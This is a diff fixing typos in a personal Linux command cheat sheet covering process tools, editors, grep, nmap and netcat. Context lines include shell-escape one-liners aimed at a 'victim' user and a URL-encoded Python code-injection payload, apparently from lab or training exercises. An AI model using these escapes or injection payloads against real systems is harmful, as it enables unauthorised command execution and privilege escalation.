@@ -108,7 +108,7 @@ cat /proc/<PROCESS_NUMBER/environ			# The environ file shows the environment var
 cat /proc/<PROCESS_NUMBER/limits 			# The limits file contains information about the limits imposed on the process.
 
 ```
-## Manageing process
+## Managing process
 ```sh
 ps -ef | less  						# this will give us similar information includeing parent process info with the PPID. 
 ps -fax | less 						# will give the forrest display of processes. Shows the relations between processes.
@@ -211,8 +211,8 @@ sudo lsof -i tcp -nP                    # for mac list all open tcp ports
 
 ## Vscode short keys
 
-- `⌘+K+0` - collapse all fucntions to lowest level
-- `⌘+K+J` - Expand all fucntions to lowest level
+- `⌘+K+0` - collapse all functions to lowest level
+- `⌘+K+J` - Expand all functions to lowest level
 
 For VSCode on a Mac, to collapse or expand just one function:
 - To collapse the current function: Place your cursor within the function you wish to collapse, then press `Command+Option+[`.
@@ -227,10 +227,10 @@ op signin
 op item create --title='NAME_OF_ITEM' --category=password --generate-password=20,letters,digits,symbols 		# 1password cli cmd to make a password and add it to your vault 
 op item edit NAME_OF_ITEM md5hash=SOME_TEXT_YOU_APPLY									# append a value to an item
 ```
-Create apassword but dont add it to your vault, grep it , cut it and clean the white spaces:
+Create a password but dont add it to your vault, grep it , cut it and clean the white spaces:
 - `op item create --title='IS_THIS_ALIVE' --category=password --generate-password=20,letters,digits,symbols --dry-run | grep password | cut -d":" -f2 | awk '{ gsub(/ /,""); print }'`
 
-## Digital OCena cli tool
+## Digital Ocean cli tool
 ```
  doctl compute droplet create --image ubuntu-22-04-x64 --size s-1vcpu-1gb --region nyc1 --ssh-keys 38069069 <NAME_OF_THE_DROPLET>
 ```
@@ -349,7 +349,7 @@ tar -tzvf <NAME_OF_CONTENTS> <NAME_TO_BACKUP_TO>    # This will compress the arc
 zip -er FILENAME.zip FILE_TO_BE_ZIPPED
 ```
 
-## Shell escapeing 
+## Shell escaping 
 ```
 sudo -u victim find /etc -name passwd -exec bash \;		# use find to look for an obvious result and then execute bash
 
@@ -369,7 +369,7 @@ perl -e 'print `cat /home/victim/key.txt`'			# notice to use single (hard) quote
 ### Running python from the url/address bar
 
 `http://ptl-665534be-b624e42e.libcurl.st/hello/hacker%22%2bstr(%20__import__('os').popen('uname%20-a').read())%2b%22`
-Notice the `__import__('os').popen('uname%20-a').read()` . We have added either sied an URL encoded '+' sigh as `%2b`.
+Notice the `__import__('os').popen('uname%20-a').read()` . We have added either side an URL encoded '+' sign as `%2b`.
 
 
 # Text editing on Linux
@@ -420,7 +420,7 @@ $ 			# to move the cursor to the end of the current line.
 ```
 
 ### More or Less
-```more``` was the original file pager so ```less``` was developed (a play on less is more).More was a developed a bit more but you can still do more with ```less```.
+```more``` was the original file pager so ```less``` was developed (a play on less is more).More was developed a bit more but you can still do more with ```less```.
 
 Less is based on VI so many keys work in there, such as search. 
 - g - go to the top of the file
@@ -482,7 +482,7 @@ egrep 'ab*c' <FILE>                         # look for expressions that have b Z
 ```
 
 ## Piping
-A pipe ```|``` is used to send the output of one command to be used as unput for the next command.
+A pipe ```|``` is used to send the output of one command to be used as input for the next command.
 - ps aux | grep http
 
 The tee command combines redirection and piping; It allows you to write output to somewhere, and at the same time, use it as input for another command.
@@ -536,7 +536,7 @@ history -c      # clears your history but not the .bash_history file. That will 
 docker run -it --name test registry.access.redhat.com/ubi8/ubi:8.1 bash		# RHEL 8
 ```
 
-### Packages Mangers
+### Packages Managers
 ```sh
 rpm -qa					# list all packages with Red Hat Package manager
 
@@ -596,7 +596,7 @@ nmap -n -T4 -vvv -p-                    # fast(-T) scan on all tcp ports(-p-) wi
 
 ```
 ## File transfer with `netcat` (nc) - CAUTION: this will open a port until you close it
-reciever: 
+receiver: 
 ```
 nc -l -p 1234 > File.txt
 ```
@@ -1106,7 +1106,7 @@ see https://danielmiessler.com/study/tcpdump/
 ```
 ### Cli tools
 
-[grex - Regex checker](https://github.com/pemistahl/grex)  - simplify creating regular expressionssimplify the often complicated and tedious task of creating regular expressions
+[grex - Regex checker](https://github.com/pemistahl/grex)  - simplify creating regular expressions. Simplify the often complicated and tedious task of creating regular expressions
 
 ## Firefox Short keys
 
